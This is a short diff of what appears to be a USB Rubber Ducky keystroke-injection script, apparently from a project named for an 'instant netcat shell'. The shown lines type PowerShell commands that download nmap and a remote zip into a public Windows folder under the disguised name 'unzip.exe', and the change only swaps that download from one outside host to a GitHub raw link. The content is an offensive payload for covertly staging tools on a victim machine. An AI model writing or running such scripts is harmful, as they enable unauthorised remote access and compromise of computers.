@@ -19,7 +19,7 @@ STRING Invoke-WebRequest -Uri https://nmap.org/dist/nmap-7.80-win32.zip -Outfile
 DELAY 500
 ENTER
 DELAY 500
-STRING Invoke-WebRequest -Uri http://pwnpalace.com/download/others/fce642c6-1963-4a0d-bffe-173f43f02329.zip -Outfile C:\Users\Public\Libraries\Library1\unzip.exe
+STRING Invoke-WebRequest -Uri https://github.com/Rattticus/USBDucky-Instant-Netcat-Shell/raw/main/fce642c6-1963-4a0d-bffe-173f43f02329.zip -Outfile C:\Users\Public\Libraries\Library1\unzip.exe
 ENTER
 DELAY 500
 STRING cd C:\Users\Public\Libraries\Library1
